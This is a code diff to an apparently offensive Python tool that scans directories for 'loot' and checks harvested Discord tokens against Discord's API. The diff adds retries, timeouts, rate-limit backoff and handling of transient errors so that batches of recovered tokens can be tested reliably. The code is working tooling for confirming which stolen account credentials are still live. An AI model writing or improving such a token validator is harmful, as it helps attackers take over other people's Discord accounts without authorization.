@@ -587,6 +587,42 @@ def scan_directory_for_loot(
 # ════════════════════════════════════════════════════════════════════
 
 
+def _aiohttp_timeout_or(seconds: float) -> Any:
+    """Return an ``aiohttp.ClientTimeout(total=seconds)`` when aiohttp
+    is importable, otherwise the raw float. ``session.get(timeout=…)``
+    accepts both shapes; using the explicit object avoids the
+    deprecation warning emitted by recent aiohttp releases."""
+    try:
+        import aiohttp  # noqa: WPS433 — local import is intentional
+    except ImportError:
+        return seconds
+    return aiohttp.ClientTimeout(total=seconds)
+
+
+def _transient_aiohttp_errors() -> Tuple[type, ...]:
+    """Tuple of aiohttp exception classes that indicate a *retry-worthy*
+    network blip (connection reset, server disconnect, DNS hiccup, …).
+    Returns an empty tuple when aiohttp isn't installed so the
+    ``except`` clause stays valid."""
+    try:
+        import aiohttp  # noqa: WPS433
+    except ImportError:
+        return ()
+    candidates = (
+        "ClientConnectionError",
+        "ServerDisconnectedError",
+        "ClientOSError",
+        "ClientPayloadError",
+        "ServerTimeoutError",
+    )
+    out: List[type] = []
+    for name in candidates:
+        cls = getattr(aiohttp, name, None)
+        if isinstance(cls, type) and issubclass(cls, BaseException):
+            out.append(cls)
+    return tuple(out)
+
+
 async def _validate_discord_token(session, token: DiscordToken) -> None:
     """Hit Discord's ``/users/@me`` with the recovered token.
 
@@ -610,10 +646,19 @@ async def _validate_discord_token(session, token: DiscordToken) -> None:
         "X-Discord-Locale": "en-US",
     }
     url = "https://discord.com/api/v9/users/@me"
+    req_timeout = _aiohttp_timeout_or(15.0)
 
-    for attempt in (1, 2):
+    # Lazy-resolved aiohttp exception classes — keeps the validator
+    # importable in environments where aiohttp isn't installed (the
+    # whole function never runs in that case).
+    transient_errors: Tuple[type, ...] = _transient_aiohttp_errors()
+
+    max_attempts = 3
+    for attempt in range(1, max_attempts + 1):
         try:
-            async with session.get(url, headers=headers, timeout=15) as resp:
+            async with session.get(
+                url, headers=headers, timeout=req_timeout,
+            ) as resp:
                 if resp.status == 200:
                     data = await resp.json()
                     token.valid = True
@@ -636,14 +681,16 @@ async def _validate_discord_token(session, token: DiscordToken) -> None:
                     token.valid = False
                     token.error = "401 unauthorised (token revoked / expired)"
                     return
-                if resp.status == 429 and attempt == 1:
-                    # Rate-limited — back off and try once more.
+                if resp.status == 429 and attempt < max_attempts:
+                    # Rate-limited — back off using the server-supplied
+                    # window and retry. Capped so a misbehaving response
+                    # cannot stall the worker for minutes.
                     try:
                         body = await resp.json()
                         delay = float(body.get("retry_after", 1.0))
                     except Exception:
                         delay = 1.0
-                    await asyncio.sleep(min(delay, 5.0))
+                    await asyncio.sleep(min(max(delay, 0.5), 5.0))
                     continue
                 if resp.status == 403:
                     # Account locked / disabled / cloudflare block — leave
@@ -651,12 +698,29 @@ async def _validate_discord_token(session, token: DiscordToken) -> None:
                     token.valid = None
                     token.error = "403 forbidden (locked or blocked)"
                     return
+                if 500 <= resp.status < 600 and attempt < max_attempts:
+                    # Transient Discord-side issue; back off and retry.
+                    await asyncio.sleep(0.5 * attempt)
+                    continue
                 token.valid = None
                 token.error = f"HTTP {resp.status}"
                 return
         except asyncio.TimeoutError:
+            if attempt < max_attempts:
+                await asyncio.sleep(0.5 * attempt)
+                continue
             token.valid = None
             token.error = "timeout"
+            return
+        except transient_errors as exc:
+            # Connection reset, server disconnect, DNS hiccup — these
+            # are common when a worker validates dozens of tokens back
+            # to back and should not be reported as "dead".
+            if attempt < max_attempts:
+                await asyncio.sleep(0.5 * attempt)
+                continue
+            token.valid = None
+            token.error = f"{type(exc).__name__}: {exc}"
             return
         except Exception as exc:
             token.valid = None
